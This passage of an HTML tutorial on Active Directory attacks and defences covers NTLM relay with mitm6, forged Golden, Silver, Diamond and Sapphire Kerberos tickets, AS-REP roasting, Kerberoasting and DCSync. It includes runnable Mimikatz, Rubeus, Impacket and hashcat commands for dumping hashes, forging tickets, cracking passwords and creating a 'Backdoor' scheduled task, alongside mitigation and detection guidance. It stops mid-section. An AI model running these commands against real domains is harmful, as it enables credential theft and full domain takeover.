        <p><strong>Check LDAP Signing and Channel Binding:</strong></p>
        <pre><code># Check LDAP signing requirements
Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=domain,DC=com" 
    -Properties * | Select-Object LDAPServerIntegrity

# Values:
# 0 = None (no signing required)
# 1 = Negotiate signing
# 2 = Require signing

# Check LDAP channel binding
# Registry: HKLM\\System\\CurrentControlSet\\Services\\NTDS\\Parameters
# LdapEnforceChannelBinding
# 0 = Never
# 1 = When supported
# 2 = Always</code></pre>

        <p><strong>Relay to LDAPS (if channel binding not enforced):</strong></p>
        <pre><code># Attempt relay to LDAPS
python ntlmrelayx.py -t ldaps://DC01.domain.com --add-computer

# Note: This will fail if channel binding is properly configured</code></pre>

        <h3>IPv6 DNS Takeover with mitm6</h3>

        <p>mitm6 exploits the fact that Windows prefers IPv6 over IPv4 and will request IPv6 DNS via DHCPv6. By responding to these requests, an attacker can become the DNS server and redirect traffic.</p>

        <p><strong>mitm6 + ntlmrelayx Attack:</strong></p>
        <pre><code># 1. Start mitm6
python mitm6.py -d domain.com

# 2. Start ntlmrelayx with LDAP target
python ntlmrelayx.py -6 -t ldaps://DC01.domain.com -wh attacker-wpad.domain.com --add-computer

# mitm6 will:
# - Respond to DHCPv6 requests
# - Set attacker as DNS server
# - Redirect WPAD requests to attacker
# - Capture authentication and relay to LDAP

# 3. Wait for authentication (happens automatically as machines request WPAD)</code></pre>

        <h3>NTLM Relay Mitigations</h3>

        <p><strong>SMB Signing:</strong></p>
        <pre><code># Enable SMB signing via GPO
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
- Microsoft network client: Digitally sign communications (always): Enabled
- Microsoft network server: Digitally sign communications (always): Enabled

# Enable via PowerShell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Verify
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
Get-SmbClientConfiguration | Select-Object RequireSecuritySignature</code></pre>

        <p><strong>LDAP Signing and Channel Binding:</strong></p>
        <pre><code># Enable LDAP signing via GPO
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
- Domain controller: LDAP server signing requirements: Require signing

# Enable LDAP channel binding
# Registry on Domain Controllers
reg add HKLM\\System\\CurrentControlSet\\Services\\NTDS\\Parameters 
    /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f

# Restart NTDS service
Restart-Service NTDS</code></pre>

        <p><strong>Extended Protection for Authentication (EPA):</strong></p>
        <pre><code># Enable EPA for IIS
# IIS Manager → Site → Authentication → Windows Authentication → Advanced Settings
# Extended Protection: Required

# Enable EPA via PowerShell
Set-WebConfigurationProperty -Filter "/system.webServer/security/authentication/windowsAuthentication" 
    -Name "extendedProtection.tokenChecking" -Value "Require" -PSPath "IIS:\\" -Location "Default Web Site"</code></pre>

        <p><strong>Disable NTLM (Ultimate Protection):</strong></p>
        <pre><code># Disable NTLM via GPO (use with caution!)
Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
- Network security: Restrict NTLM: Incoming NTLM traffic: Deny all accounts
- Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers: Deny all

# Monitor NTLM usage before disabling
- Network security: Restrict NTLM: Audit Incoming NTLM Traffic: Enable auditing for all accounts
- Network security: Restrict NTLM: Audit NTLM authentication in this domain: Enable all</code></pre>

        <p><strong>Detection Strategies:</strong></p>
        <pre><code># Monitor for NTLM relay indicators

# Event ID 4624 - Logon events
# Look for:
# - Logon Type 3 (Network)
# - Authentication Package: NTLM
# - Source IP different from expected

# Event ID 4648 - Explicit credential use
# Indicates credential delegation

# Monitor for suspicious computer account creation
Get-ADComputer -Filter {Created -gt $Yesterday} | 
    Select-Object Name, Created, Creator

# Monitor for RBCD modifications
# Event ID 5136 - Directory Service object modified
# Look for changes to msDS-AllowedToActOnBehalfOfOtherIdentity

# Monitor for DCSync rights granted
# Event ID 5136 - Directory Service object modified
# Look for changes to DS-Replication-Get-Changes permissions</code></pre>

        <h2>Advanced Ticket Attacks</h2>

        <h3>Golden Ticket Attack Deep Dive</h3>

        <p>A Golden Ticket is a forged Ticket Granting Ticket (TGT) created using the krbtgt account's password hash. Since the krbtgt account is used to sign all TGTs in the domain, possessing its hash allows an attacker to create valid TGTs for any user, including non-existent users.</p>

        <p><strong>Golden Ticket Characteristics:</strong></p>
        <ul>
            <li>Provides complete domain access</li>
            <li>Works even if the user account is deleted or disabled</li>
            <li>Bypasses most authentication controls</li>
            <li>Can specify arbitrary group memberships (including Domain Admins)</li>
            <li>Default lifetime of 10 years (can be customized)</li>
            <li>Persists until krbtgt password is changed twice</li>
        </ul>

        <p><strong>Golden Ticket Requirements:</strong></p>
        <ul>
            <li>krbtgt account NTLM hash (or AES key)</li>
            <li>Domain SID</li>
            <li>Domain FQDN</li>
            <li>Username to impersonate (can be fictional)</li>
        </ul>

        <p><strong>Obtaining krbtgt Hash:</strong></p>
        <pre><code># Using Mimikatz DCSync (requires DA or DCSync rights)
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# Using Impacket secretsdump
python secretsdump.py domain.com/Administrator:password@DC01.domain.com -just-dc-user krbtgt

# From NTDS.dit (if you have DC access)
python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Output will show:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::</code></pre>

        <p><strong>Getting Domain SID:</strong></p>
        <pre><code># PowerShell
Get-ADDomain | Select-Object DomainSID

# PowerView
Get-DomainSID

# WMIC
wmic useraccount get name,sid

# From any domain user SID (remove the last part - RID)
# Example: S-1-5-21-1234567890-1234567890-1234567890-1001
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890</code></pre>

        <p><strong>Creating Golden Ticket with Mimikatz:</strong></p>
        <pre><code># Basic Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:[NTLM_HASH] /ptt

# Golden Ticket with custom groups
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:[NTLM_HASH] 
    /groups:512,513,518,519,520 /ptt

# Golden Ticket with AES256 key (more stealthy)
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /aes256:[AES256_KEY] /ptt

# Golden Ticket with custom lifetime
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:[NTLM_HASH] 
    /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Save ticket to file
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:[NTLM_HASH] /ticket:golden.kirbi</code></pre>

        <p><strong>Creating Golden Ticket with Rubeus:</strong></p>
        <pre><code># Basic Golden Ticket
.\\Rubeus.exe golden /rc4:[NTLM_HASH] /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /ptt

# With AES256
.\\Rubeus.exe golden /aes256:[AES256_KEY] /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /ptt

# Specify domain controller
.\\Rubeus.exe golden /rc4:[NTLM_HASH] /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /user:Administrator /dc:DC01.domain.com /ptt</code></pre>

        <p><strong>Creating Golden Ticket with Impacket:</strong></p>
        <pre><code># Create Golden Ticket
python ticketer.py -nthash [NTLM_HASH] -domain-sid S-1-5-21-XXX-XXX-XXX 
    -domain domain.com Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass domain.com/Administrator@DC01.domain.com</code></pre>

        <p><strong>Using Golden Ticket:</strong></p>
        <pre><code># After injecting ticket with /ptt, verify
klist

# Access domain resources
dir \\\\DC01\\C$
dir \\\\DC01\\ADMIN$

# Execute commands
PsExec.exe \\\\DC01 cmd.exe

# Perform DCSync
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator</code></pre>

        <h3>Silver Ticket Attack Deep Dive</h3>

        <p>A Silver Ticket is a forged service ticket (TGS) for a specific service. Unlike Golden Tickets which forge TGTs, Silver Tickets forge tickets for individual services using the service account's password hash.</p>

        <p><strong>Silver Ticket Advantages:</strong></p>
        <ul>
            <li>More stealthy (no communication with DC for TGT)</li>
            <li>Harder to detect (no Event ID 4768 for TGT request)</li>
            <li>Works even if krbtgt is rotated</li>
            <li>Can target specific services</li>
        </ul>

        <p><strong>Silver Ticket Limitations:</strong></p>
        <ul>
            <li>Limited to specific service</li>
            <li>Requires service account hash (not krbtgt)</li>
            <li>Cannot be used to request additional service tickets</li>
            <li>May fail if service validates PAC with DC</li>
        </ul>

        <p><strong>Common Service Targets:</strong></p>
        <ul>
            <li><strong>CIFS:</strong> File access (\\\\server\\share)</li>
            <li><strong>HOST:</strong> Scheduled tasks, WMI, PowerShell remoting</li>
            <li><strong>HTTP:</strong> Web applications</li>
            <li><strong>MSSQL:</strong> SQL Server access</li>
            <li><strong>LDAP:</strong> Directory access (can enable DCSync)</li>
            <li><strong>RPCSS:</strong> WMI access</li>
        </ul>

        <p><strong>Obtaining Service Account Hash:</strong></p>
        <pre><code># For computer accounts (most services run as SYSTEM)
# Computer account hash = NTLM hash of computer account password

# DCSync computer account
mimikatz # lsadump::dcsync /domain:domain.com /user:SERVER01$

# From local SAM (if you have local admin)
mimikatz # lsadump::sam

# For user service accounts
# DCSync the service account
mimikatz # lsadump::dcsync /domain:domain.com /user:svc_sql</code></pre>

        <p><strong>Creating Silver Ticket with Mimikatz:</strong></p>
        <pre><code># Silver Ticket for CIFS service
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:SERVER01.domain.com 
    /service:cifs /rc4:[SERVICE_HASH] /ptt

# Silver Ticket for HOST service (enables scheduled tasks, WMI)
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:SERVER01.domain.com 
    /service:host /rc4:[COMPUTER_HASH] /ptt

# Silver Ticket for HTTP service
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:web.domain.com 
    /service:http /rc4:[SERVICE_HASH] /ptt

# Silver Ticket for MSSQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:sql.domain.com 
    /service:mssql /rc4:[SERVICE_HASH] /ptt

# Silver Ticket for LDAP (DCSync)
mimikatz # kerberos::golden /user:Administrator /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:DC01.domain.com 
    /service:ldap /rc4:[DC_HASH] /ptt</code></pre>

        <p><strong>Creating Silver Ticket with Rubeus:</strong></p>
        <pre><code># Silver Ticket for CIFS
.\\Rubeus.exe silver /rc4:[SERVICE_HASH] /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:SERVER01.domain.com 
    /service:cifs /user:Administrator /ptt

# Silver Ticket for multiple services
.\\Rubeus.exe silver /rc4:[COMPUTER_HASH] /domain:domain.com 
    /sid:S-1-5-21-XXX-XXX-XXX /target:SERVER01.domain.com 
    /service:cifs/host /user:Administrator /ptt</code></pre>

        <p><strong>Using Silver Ticket:</strong></p>
        <pre><code># After injecting CIFS ticket
dir \\\\SERVER01\\C$

# After injecting HOST ticket
schtasks /create /tn "Backdoor" /tr "cmd.exe /c payload.exe" 
    /sc once /st 00:00 /S SERVER01

# After injecting HTTP ticket
Invoke-WebRequest -Uri "http://web.domain.com/admin" -UseDefaultCredentials

# After injecting MSSQL ticket
sqlcmd -S sql.domain.com -E -Q "SELECT @@version"</code></pre>

        <h3>Diamond Ticket Attack</h3>

        <p>Diamond Tickets are a more sophisticated evolution of Golden Tickets. Instead of forging a TGT from scratch, a Diamond Ticket modifies a legitimate TGT obtained from the DC, making it harder to detect.</p>

        <p><strong>Diamond Ticket Advantages:</strong></p>
        <ul>
            <li>Uses legitimate TGT as base (harder to detect)</li>
            <li>Includes valid PAC signature from DC</li>
            <li>Bypasses some Golden Ticket detection mechanisms</li>
            <li>Appears more legitimate in logs</li>
        </ul>

        <p><strong>Creating Diamond Ticket with Rubeus:</strong></p>
        <pre><code># Diamond Ticket requires:
# - krbtgt hash (like Golden Ticket)
# - Ability to request a TGT (any domain user credentials)

# Create Diamond Ticket
.\\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator 
    /ticketuserid:500 /groups:512 
    /krbkey:[KRBTGT_AES256_KEY] /ptt

# The /tgtdeleg flag requests a TGT using the current user's credentials
# Then modifies it to impersonate Administrator</code></pre>

        <h3>Sapphire Ticket Attack</h3>

        <p>Sapphire Tickets target inter-realm trust relationships. They forge inter-realm TGTs to access resources in trusted domains/forests.</p>

        <p><strong>Sapphire Ticket Use Case:</strong></p>
        <p>When you have compromised one domain and want to access resources in a trusted domain without compromising the trusted domain's krbtgt.</p>

        <p><strong>Creating Sapphire Ticket:</strong></p>
        <pre><code># Requires trust key (inter-realm key)
# Obtain trust key via DCSync
mimikatz # lsadump::trust /patch

# Create inter-realm TGT
mimikatz # kerberos::golden /domain:child.domain.com 
    /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 
    /rc4:[TRUST_KEY] /user:Administrator /service:krbtgt 
    /target:parent.domain.com /ticket:sapphire.kirbi</code></pre>

        <h3>Ticket Attack Detection</h3>

        <p><strong>Golden Ticket Detection:</strong></p>
        <pre><code># Indicators of Golden Ticket:
# 1. Event ID 4768 (TGT request) missing for authentication
# 2. Event ID 4769 (Service ticket request) without corresponding 4768
# 3. Unusual account names or non-existent accounts
# 4. Tickets with lifetime longer than policy
# 5. Tickets with unusual encryption types
# 6. Account usage after password change

# Monitor for suspicious TGT requests
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4768
} | Where-Object { 
    $_.Properties[9].Value -eq '0x17' # RC4 encryption (suspicious if AES is enforced)
}

# Check for tickets with unusual lifetimes
# Normal TGT lifetime: 10 hours
# Golden Tickets often have much longer lifetimes

# Monitor krbtgt password changes
Get-ADUser krbtgt -Properties PasswordLastSet</code></pre>

        <p><strong>Silver Ticket Detection:</strong></p>
        <pre><code># Indicators of Silver Ticket:
# 1. Event ID 4769 without corresponding 4768
# 2. Service ticket requests from unusual sources
# 3. Tickets for services that don't exist
# 4. Unusual encryption types

# Monitor for service tickets without TGT
# Event ID 4769 (Service ticket request)
# Look for tickets where there's no recent 4768 for the same user

# Enable PAC validation
# Forces services to validate PAC with DC
# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters
# ValidateKdcPacSignature = 1</code></pre>

        <p><strong>General Ticket Attack Mitigations:</strong></p>
        <ul>
            <li><strong>Rotate krbtgt Password:</strong> Twice (to invalidate old tickets), wait for replication between rotations</li>
            <li><strong>Enable AES Encryption:</strong> Disable RC4 to make forged tickets more difficult</li>
            <li><strong>Monitor Privileged Account Usage:</strong> Alert on unusual authentication patterns</li>
            <li><strong>Implement Credential Guard:</strong> Protects credentials in isolated environment</li>
            <li><strong>Use Microsoft Defender for Identity:</strong> Detects Golden/Silver ticket usage</li>
            <li><strong>Reduce TGT Lifetime:</strong> Shorter lifetime reduces window of opportunity</li>
        </ul>

        <p><strong>Rotating krbtgt Password:</strong></p>
        <pre><code># Use Microsoft's script for safe krbtgt rotation
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# First rotation
.\\New-KrbtgtKeys.ps1 -WhatIf
.\\New-KrbtgtKeys.ps1

# Wait for replication (at least maximum TGT lifetime - default 10 hours)
# Check replication
repadmin /showrepl

# Second rotation (invalidates tickets created with old password)
.\\New-KrbtgtKeys.ps1

# Verify
Get-ADUser krbtgt -Properties PasswordLastSet</code></pre>

        <h2>Roasting Attacks</h2>

        <h3>AS-REP Roasting Deep Dive</h3>

        <p>AS-REP Roasting exploits user accounts that have "Do not require Kerberos preauthentication" enabled. This misconfiguration allows an attacker to request authentication data (AS-REP) for these users without providing valid credentials, and then crack the encrypted portion offline.</p>

        <p><strong>How AS-REP Roasting Works:</strong></p>
        <ol>
            <li>Attacker identifies users with DONT_REQ_PREAUTH flag set</li>
            <li>Attacker sends AS-REQ to KDC for these users (no pre-authentication needed)</li>
            <li>KDC responds with AS-REP containing encrypted session key</li>
            <li>Encrypted portion uses user's password hash</li>
            <li>Attacker cracks the encryption offline to recover password</li>
        </ol>

        <p><strong>Why This Works:</strong></p>
        <p>Normally, Kerberos pre-authentication requires the client to encrypt a timestamp with their password hash, proving they know the password before the KDC sends back encrypted data. When pre-authentication is disabled, the KDC sends encrypted data without this proof, allowing offline cracking.</p>

        <p><strong>AS-REP Roasting Enumeration:</strong></p>
        <pre><code># PowerView - Find users without pre-authentication
Get-DomainUser -PreauthNotRequired

# PowerView - Get detailed information
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol

# LDAP query
# userAccountControl flag: DONT_REQ_PREAUTH (4194304)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# BloodHound query
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Check specific user
Get-ADUser -Identity "vulnerable_user" -Properties DoesNotRequirePreAuth</code></pre>

        <p><strong>AS-REP Roasting with Rubeus:</strong></p>
        <pre><code># Roast all vulnerable users
.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Roast specific user
.\\Rubeus.exe asreproast /user:vulnerable_user /format:hashcat

# Roast with specific domain controller
.\\Rubeus.exe asreproast /dc:DC01.domain.com /format:hashcat

# Output format for John the Ripper
.\\Rubeus.exe asreproast /format:john /outfile:asrep_hashes.txt</code></pre>

        <p><strong>AS-REP Roasting with Impacket:</strong></p>
        <pre><code># Roast with user list
python GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Roast with domain credentials (enumerates vulnerable users automatically)
python GetNPUsers.py domain.com/user:password -request -format hashcat -outputfile asrep_hashes.txt

# Roast specific user without credentials
python GetNPUsers.py domain.com/vulnerable_user -no-pass -format hashcat

# Roast with specific DC
python GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat</code></pre>

        <p><strong>AS-REP Roasting without Domain Credentials:</strong></p>
        <pre><code># If you don't have domain credentials, you can still roast if you know usernames
# Create a user list (common usernames, from OSINT, etc.)
echo "administrator" > users.txt
echo "admin" >> users.txt
echo "svc_backup" >> users.txt

# Attempt roasting
python GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -dc-ip 192.168.1.10</code></pre>

        <p><strong>Cracking AS-REP Hashes:</strong></p>
        <pre><code># Hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Hashcat with rules
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule

# John the Ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt

# John with rules
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt --rules=Jumbo</code></pre>

        <h3>Kerberoasting Deep Dive</h3>

        <p>Kerberoasting exploits the fact that any authenticated domain user can request service tickets (TGS) for any Service Principal Name (SPN) in the domain. These service tickets are encrypted with the service account's password hash, allowing offline cracking.</p>

        <p><strong>How Kerberoasting Works:</strong></p>
        <ol>
            <li>Attacker authenticates to domain as any valid user</li>
            <li>Attacker enumerates Service Principal Names (SPNs)</li>
            <li>Attacker requests TGS tickets for discovered SPNs</li>
            <li>TGS tickets are encrypted with service account password hash</li>
            <li>Attacker extracts encrypted portions and cracks offline</li>
        </ol>

        <p><strong>Why This Works:</strong></p>
        <p>Service accounts often have weak passwords (for convenience) and high privileges (for functionality). The combination makes them prime targets. Additionally, service account passwords are rarely changed, giving attackers unlimited time to crack.</p>

        <p><strong>SPN Enumeration:</strong></p>
        <pre><code># PowerView - Find all users with SPNs
Get-DomainUser -SPN

# PowerView - Get detailed SPN information
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Native PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Using setspn.exe
setspn -Q */*

# Find specific service types
setspn -Q MSSQLSvc/*
setspn -Q HTTP/*

# BloodHound query
MATCH (u:User {hasspn:true}) RETURN u</code></pre>

        <p><strong>Kerberoasting with Rubeus:</strong></p>
        <pre><code># Kerberoast all users with SPNs
.\\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

# Kerberoast specific user
.\\Rubeus.exe kerberoast /user:svc_sql /format:hashcat

# Kerberoast specific SPN
.\\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.com:1433 /format:hashcat

# Kerberoast with specific encryption type (downgrade to RC4)
.\\Rubeus.exe kerberoast /tgtdeleg /format:hashcat

# Output for John the Ripper
.\\Rubeus.exe kerberoast /format:john /outfile:kerberoast_hashes.txt

# Kerberoast and display statistics
.\\Rubeus.exe kerberoast /stats</code></pre>

        <p><strong>Kerberoasting with Impacket:</strong></p>
        <pre><code># Kerberoast with domain credentials
python GetUserSPNs.py domain.com/user:password -request -outputfile kerberoast_hashes.txt

# Kerberoast with specific DC
python GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Kerberoast specific user
python GetUserSPNs.py domain.com/user:password -request-user svc_sql

# Save tickets for later use
python GetUserSPNs.py domain.com/user:password -request -save</code></pre>

        <p><strong>Kerberoasting with PowerShell (Manual):</strong></p>
        <pre><code># Request service ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"

# View tickets
klist

# Export tickets with Mimikatz
mimikatz # kerberos::list /export

# Convert to hashcat format
# Use tools like kirbi2john.py or kerberoast scripts</code></pre>

        <p><strong>Targeted Kerberoasting:</strong></p>
        <p>Focus on high-value targets to maximize impact:</p>

        <pre><code># Find service accounts that are members of privileged groups
Get-DomainUser -SPN | Get-DomainGroup | Where-Object { 
    $_.Name -like "*admin*" -or $_.Name -like "*privileged*" 
}

# Find service accounts with adminCount=1 (indicates privileged)
Get-DomainUser -SPN | Where-Object { $_.admincount -eq 1 }

# Find service accounts with old passwords
Get-DomainUser -SPN | Where-Object { 
    $_.pwdlastset -lt (Get-Date).AddYears(-1) 
}

# Prioritize accounts with weak encryption
# RC4 is weaker than AES, prioritize RC4-encrypted tickets</code></pre>

        <p><strong>Cracking Kerberoast Hashes:</strong></p>
        <pre><code># Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# Hashcat with rules
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule

# Hashcat with mask attack (for password patterns)
hashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d

# John the Ripper
john --format=krb5tgs kerberoast_hashes.txt --wordlist=wordlist.txt

# John with rules
john --format=krb5tgs kerberoast_hashes.txt --wordlist=wordlist.txt --rules=Jumbo</code></pre>

        <p><strong>Kerberoasting Optimization Tips:</strong></p>
        <ul>
            <li><strong>Target RC4 Tickets:</strong> RC4 is faster to crack than AES</li>
            <li><strong>Use GPU Cracking:</strong> Significantly faster than CPU</li>
            <li><strong>Focus on Old Accounts:</strong> Likely to have weaker passwords</li>
            <li><strong>Use Targeted Wordlists:</strong> Company-specific, season+year patterns</li>
            <li><strong>Leverage Breached Passwords:</strong> Many service accounts use common passwords</li>
        </ul>

        <h3>Roasting Defense Strategies</h3>

        <p><strong>AS-REP Roasting Mitigations:</strong></p>
        <pre><code># Find and fix accounts without pre-authentication
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | 
    Set-ADUser -DoesNotRequirePreAuth $false

# Audit accounts with this setting
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | 
    Select-Object Name, Enabled, PasswordLastSet

# Monitor for AS-REP roasting attempts
# Event ID 4768 - Kerberos TGT request
# Look for pre-authentication type: 0 (no pre-auth)

# Enable pre-authentication via GPO
# User Configuration → Policies → Windows Settings → Security Settings → Account Policies → Kerberos Policy
# This setting should be enforced for all users</code></pre>

        <p><strong>Kerberoasting Mitigations:</strong></p>
        <pre><code># Use Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA)
# These have 120-character random passwords that rotate automatically

# Create gMSA
New-ADServiceAccount -Name "gMSA_SQL" -DNSHostName "sql.domain.com" 
    -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers"

# Install gMSA on server
Install-ADServiceAccount -Identity "gMSA_SQL"

# Use gMSA for service
# Services → SQL Server → Log On → This account: DOMAIN\\gMSA_SQL$

# For accounts that can't use gMSA, enforce strong passwords
# Minimum 25 characters, complex, random

# Audit service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | 
    Select-Object Name, PasswordLastSet, PasswordNeverExpires, Enabled

# Set strong password policy for service accounts
# Create separate OU for service accounts with strict password policy

# Disable RC4 encryption (forces AES, harder to crack)
# Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
# Network security: Configure encryption types allowed for Kerberos
# Uncheck: RC4_HMAC_MD5</code></pre>

        <p><strong>Detection Strategies:</strong></p>
        <pre><code># Monitor for Kerberoasting
# Event ID 4769 - Kerberos service ticket requested
# Look for:
# - Multiple ticket requests in short time
# - Ticket requests for unusual SPNs
# - Ticket requests with RC4 encryption when AES is available
# - Ticket requests from unusual sources

# PowerShell monitoring script
$Events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4769
} | Where-Object { 
    $_.Properties[8].Value -eq '0x17' # RC4 encryption
} | Group-Object -Property {$_.Properties[0].Value} | 
    Where-Object { $_.Count -gt 10 } # More than 10 tickets

# Monitor for AS-REP roasting
# Event ID 4768 - Kerberos TGT requested
# Look for pre-authentication type: 0

# Use Microsoft Defender for Identity
# Automatically detects Kerberoasting and AS-REP roasting attempts

# Honeypot accounts
# Create fake service accounts with SPNs and monitor for ticket requests
New-ADUser -Name "svc_honeypot" -ServicePrincipalName "HTTP/honeypot.domain.com" 
    -AccountPassword (ConvertTo-SecureString "ComplexPassword123!" -AsPlainText -Force)

# Alert on any ticket requests for honeypot SPNs</code></pre>

        <p><strong>Incident Response:</strong></p>
        <pre><code># If roasting is detected:

# 1. Identify compromised accounts
# Check Event ID 4769 for targeted SPNs

# 2. Reset passwords immediately
Set-ADAccountPassword -Identity "svc_sql" -Reset

# 3. Enable pre-authentication if disabled
Set-ADUser -Identity "vulnerable_user" -DoesNotRequirePreAuth $false

# 4. Investigate source of attacks
# Check Event ID 4769 for source IP addresses

# 5. Implement gMSA for service accounts
# Migrate service accounts to gMSA to prevent future attacks

# 6. Review and strengthen password policies
# Ensure service accounts have strong, unique passwords

# 7. Disable RC4 encryption
# Force AES encryption to make cracking harder</code></pre>

        <h2>DCSync and Replication Attacks</h2>

        <h3>DCSync Attack Deep Dive</h3>

        <p>DCSync is a technique that simulates the behavior of a Domain Controller to request password data from another DC using the Directory Replication Service (DRS) Remote Protocol. This allows an attacker to retrieve password hashes for any user in the domain without executing code on the DC.</p>

        <p><strong>How DCSync Works:</strong></p>
        <ol>
            <li>Attacker obtains account with replication permissions</li>
            <li>Attacker initiates replication request to Domain Controller</li>
            <li>DC responds with password data (NTLM hashes, Kerberos keys)</li>
            <li>Attacker extracts credentials without touching LSASS or NTDS.dit</li>
        </ol>

        <p><strong>Required Permissions:</strong></p>
        <ul>
            <li><strong>DS-Replication-Get-Changes</strong> (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
            <li><strong>DS-Replication-Get-Changes-All</strong> (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
            <li><strong>DS-Replication-Get-Changes-In-Filtered-Set</strong> (GUID: 89e95b76-444d-4c62-991a-0facbeda640c) - Optional, for RODC</li>
        </ul>

        <p><strong>Default Accounts with DCSync Rights:</strong></p>
        <ul>
            <li>Domain Admins</li>
            <li>Enterprise Admins</li>
            <li>Administrators</li>
            <li>Domain Controllers (computer accounts)</li>
        </ul>

        <p><strong>Enumerate DCSync Permissions:</strong></p>
        <pre><code># PowerView - Find users with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=domain,DC=com" -ResolveGUIDs | 
    Where-Object { 
        $_.ObjectAceType -match "Replication-Get-Changes" 
    } | Select-Object SecurityIdentifier, ObjectAceType

# PowerView - Check specific user
Get-DomainObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs | 
    Where-Object { 
        $_.SecurityIdentifier -eq (Get-DomainUser -Identity "attacker").objectsid 
    }

# BloodHound query - Find users with DCSync rights
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:GetChanges|GetChangesAll*1..]->(d:Domain) 
RETURN u.name, g.name, d.name

# BloodHound query - Find path from owned user to DCSync
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)-[:GetChanges|GetChangesAll*1..]->(d:Domain)) 
RETURN p

# Native PowerShell
$RootDSE = Get-ADRootDSE
$DomainDN = $RootDSE.defaultNamingContext
(Get-Acl "AD:$DomainDN").Access | Where-Object { 
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" 
}</code></pre>

        <p><strong>DCSync with Mimikatz:</strong></p>
        <pre><code># DCSync specific user
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator

# DCSync krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# DCSync all users
